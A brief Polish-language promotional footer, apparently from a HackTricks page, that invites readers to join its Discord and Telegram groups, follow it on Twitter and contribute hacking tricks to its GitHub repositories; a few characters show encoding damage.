* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si sztuczkami hackingowymi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
